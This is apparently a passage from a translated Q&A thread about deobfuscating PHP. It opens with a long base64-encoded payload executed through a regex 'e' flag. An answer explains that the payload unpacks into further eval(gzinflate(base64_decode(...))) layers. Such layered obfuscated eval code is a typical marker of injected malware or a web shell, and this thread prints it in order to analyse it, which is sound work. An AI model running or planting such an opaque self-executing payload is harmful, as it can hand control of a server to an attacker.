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'\x29\x29\x29\x3B","."); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T07:08:01.650

从正则表达式中删除`e`标志，然后运行它。你会看到它试图运行的代码。

然后你会发现它变得更加模糊......

```
eval(gzinflate(base64_decode('7X1re9...'))); 
```

